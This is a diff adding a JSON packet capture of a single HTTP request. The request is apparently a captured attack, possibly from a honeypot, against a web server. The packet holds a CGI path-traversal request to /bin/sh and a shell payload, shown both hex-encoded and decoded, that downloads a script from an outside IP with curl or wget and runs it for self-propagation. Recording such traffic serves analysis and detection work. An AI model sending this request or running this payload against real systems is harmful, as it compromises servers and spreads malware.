@@ -1,0 +1,181 @@
+[
+    {
+        "_index": "packets-2025-01-06",
+        "_type": "doc",
+        "_score": null,
+        "_source": {
+            "layers": {
+                "frame": {
+                    "frame.encap_type": "1",
+                    "frame.time": "Jan  6, 2025 11:43:23.000000000 \ub300\ud55c\ubbfc\uad6d \ud45c\uc900\uc2dc",
+                    "frame.time_utc": "Jan  6, 2025 02:43:23.000000000 UTC",
+                    "frame.time_epoch": "1736131403.000000000",
+                    "frame.offset_shift": "0.000000000",
+                    "frame.time_delta": "0.000000000",
+                    "frame.time_delta_displayed": "0.000000000",
+                    "frame.time_relative": "0.000000000",
+                    "frame.number": "1",
+                    "frame.len": "428",
+                    "frame.cap_len": "428",
+                    "frame.marked": "0",
+                    "frame.ignored": "0",
+                    "frame.protocols": "eth:ethertype:ip:tcp:http:data-text-lines"
+                },
+                "eth": {
+                    "eth.dst": "00:04:96:52:5d:79",
+                    "eth.dst_tree": {
+                        "eth.dst_resolved": "ExtremeNetwo_52:5d:79",
+                        "eth.dst.oui": "1174",
+                        "eth.dst.oui_resolved": "Extreme Networks Headquarters",
+                        "eth.dst.lg": "0",
+                        "eth.dst.ig": "0",
+                        "eth.addr": "00:04:96:52:5d:79",
+                        "eth.addr_resolved": "ExtremeNetwo_52:5d:79",
+                        "eth.addr.oui": "1174",
+                        "eth.addr.oui_resolved": "Extreme Networks Headquarters",
+                        "eth.lg": "0",
+                        "eth.ig": "0"
+                    },
+                    "eth.src": "00:26:98:27:79:10",
+                    "eth.src_tree": {
+                        "eth.src_resolved": "Cisco_27:79:10",
+                        "eth.src.oui": "9880",
+                        "eth.src.oui_resolved": "Cisco Systems, Inc",
+                        "eth.src.lg": "0",
+                        "eth.src.ig": "0",
+                        "eth.addr": "00:26:98:27:79:10",
+                        "eth.addr_resolved": "Cisco_27:79:10",
+                        "eth.addr.oui": "9880",
+                        "eth.addr.oui_resolved": "Cisco Systems, Inc",
+                        "eth.lg": "0",
+                        "eth.ig": "0"
+                    },
+                    "eth.type": "0x0800",
+                    "eth.stream": "0"
+                },
+                "ip": {
+                    "ip.version": "4",
+                    "ip.hdr_len": "20",
+                    "ip.dsfield": "0x00",
+                    "ip.dsfield_tree": {
+                        "ip.dsfield.dscp": "0",
+                        "ip.dsfield.ecn": "0"
+                    },
+                    "ip.len": "414",
+                    "ip.id": "0x93a1",
+                    "ip.flags": "0x02",
+                    "ip.flags_tree": {
+                        "ip.flags.rb": "0",
+                        "ip.flags.df": "1",
+                        "ip.flags.mf": "0"
+                    },
+                    "ip.frag_offset": "0",
+                    "ip.ttl": "43",
+                    "ip.proto": "6",
+                    "ip.checksum": "0xab8a",
+                    "ip.checksum.status": "2",
+                    "ip.src": "43.130.151.76",
+                    "ip.addr": "223.63.109.32",
+                    "ip.src_host": "43.130.151.76",
+                    "ip.host": "223.63.109.32",
+                    "ip.dst": "223.63.109.32",
+                    "ip.dst_host": "223.63.109.32",
+                    "ip.stream": "0"
+                },
+                "tcp": {
+                    "tcp.srcport": "48194",
+                    "tcp.dstport": "80",
+                    "tcp.port": "80",
+                    "tcp.stream": "0",
+                    "tcp.completeness": "0",
+                    "tcp.completeness_tree": {
+                        "tcp.completeness.rst": "0",
+                        "tcp.completeness.fin": "0",
+                        "tcp.completeness.data": "0",
+                        "tcp.completeness.ack": "0",
+                        "tcp.completeness.syn-ack": "0",
+                        "tcp.completeness.syn": "0",
+                        "tcp.completeness.str": "[ Null ]"
+                    },
+                    "tcp.len": "362",
+                    "tcp.seq": "1",
+                    "tcp.seq_raw": "1451278917",
+                    "tcp.nxtseq": "363",
+                    "tcp.ack": "1",
+                    "tcp.ack_raw": "896030014",
+                    "tcp.hdr_len": "32",
+                    "tcp.flags": "0x0018",
+                    "tcp.flags_tree": {
+                        "tcp.flags.res": "0",
+                        "tcp.flags.ae": "0",
+                        "tcp.flags.cwr": "0",
+                        "tcp.flags.ece": "0",
+                        "tcp.flags.urg": "0",
+                        "tcp.flags.ack": "1",
+                        "tcp.flags.push": "1",
+                        "tcp.flags.reset": "0",
+                        "tcp.flags.syn": "0",
+                        "tcp.flags.fin": "0",
+                        "tcp.flags.str": "\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7AP\u00b7\u00b7\u00b7"
+                    },
+                    "tcp.window_size_value": "502",
+                    "tcp.window_size": "502",
+                    "tcp.window_size_scalefactor": "-1",
+                    "tcp.checksum": "0xa5d5",
+                    "tcp.checksum.status": "2",
+                    "tcp.urgent_pointer": "0",
+                    "tcp.options": "01:01:08:0a:a0:2e:b3:19:06:99:1a:7f",
+                    "tcp.options_tree": {
+                        "tcp.options.nop": "01",
+                        "tcp.options.nop_tree": {
+                            "tcp.option_kind": "1"
+                        },
+                        "tcp.options.timestamp": "08:0a:a0:2e:b3:19:06:99:1a:7f",
+                        "tcp.options.timestamp_tree": {
+                            "tcp.option_kind": "8",
+                            "tcp.option_len": "10",
+                            "tcp.options.timestamp.tsval": "2687415065",
+                            "tcp.options.timestamp.tsecr": "110697087"
+                        }
+                    },
+                    "Timestamps": {
+                        "tcp.time_relative": "0.000000000",
+                        "tcp.time_delta": "0.000000000"
+                    },
+                    "tcp.analysis": {
+                        "tcp.analysis.bytes_in_flight": "362",
+                        "tcp.analysis.push_bytes_sent": "362"
+                    },
+                    "tcp.payload": "50:4f:53:54:20:2f:63:67:69:2d:62:69:6e:2f:2e:25:32:65:2f:2e:25:32:65:2f:2e:25:32:65:2f:2e:25:32:65:2f:2e:25:32:65:2f:2e:25:32:65:2f:2e:25:32:65:2f:2e:25:32:65:2f:2e:25:32:65:2f:2e:25:32:65:2f:62:69:6e:2f:73:68:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:32:32:33:2e:36:33:2e:31:30:39:2e:33:32:3a:38:30:0d:0a:41:63:63:65:70:74:3a:20:2a:2f:2a:0d:0a:55:70:67:72:61:64:65:2d:49:6e:73:65:63:75:72:65:2d:52:65:71:75:65:73:74:73:3a:20:31:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:43:75:73:74:6f:6d:2d:41:73:79:6e:63:48:74:74:70:43:6c:69:65:6e:74:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:74:65:78:74:2f:70:6c:61:69:6e:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:31:30:35:0d:0a:0d:0a:58:3d:24:28:63:75:72:6c:20:68:74:74:70:3a:2f:2f:39:34:2e:31:35:36:2e:31:37:37:2e:31:30:39:2f:73:68:20:7c:7c:20:77:67:65:74:20:68:74:74:70:3a:2f:2f:39:34:2e:31:35:36:2e:31:37:37:2e:31:30:39:2f:73:68:20:2d:4f:2d:29:3b:20:65:63:68:6f:20:22:24:58:22:20:7c:20:73:68:20:2d:73:20:61:70:61:63:68:65:2e:73:65:6c:66:72:65:70"
+                },
+                "http": {
+                    "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1\\r\\n": {
+                        "http.request.method": "POST",
+                        "http.request.uri": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh",
+                        "http.request.version": "HTTP/1.1"
+                    },
+                    "http.host": "223.63.109.32:80",
+                    "http.host": "223.63.109.32:80",
+                    "http.host": "223.63.109.32:80",
+                    "http.host": "223.63.109.32:80",
+                    "http.request.line": "Content-Length: 105\r\n",
+                    "http.accept": "*/*",
+                    "http.user_agent": "Custom-AsyncHttpClient",
+                    "http.connection": "keep-alive",
+                    "http.content_type": "text/plain",
+                    "http.content_length_header": "105",
+                    "http.content_length_header_tree": {
+                        "http.content_length": "105"
+                    },
+                    "\\r\\n": "",
+                    "http.request": "1",
+                    "http.request.full_uri": "http://223.63.109.32:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh",
+                    "http.file_data": "58:3d:24:28:63:75:72:6c:20:68:74:74:70:3a:2f:2f:39:34:2e:31:35:36:2e:31:37:37:2e:31:30:39:2f:73:68:20:7c:7c:20:77:67:65:74:20:68:74:74:70:3a:2f:2f:39:34:2e:31:35:36:2e:31:37:37:2e:31:30:39:2f:73:68:20:2d:4f:2d:29:3b:20:65:63:68:6f:20:22:24:58:22:20:7c:20:73:68:20:2d:73:20:61:70:61:63:68:65:2e:73:65:6c:66:72:65:70"  
+                },
+                "data-text-lines": {
+                    "X=$(curl http://94.156.177.109/sh || wget http://94.156.177.109/sh -O-); echo \"$X\" | sh -s apache.selfrep": ""
+                }
+            }
+        }
+    }
+]
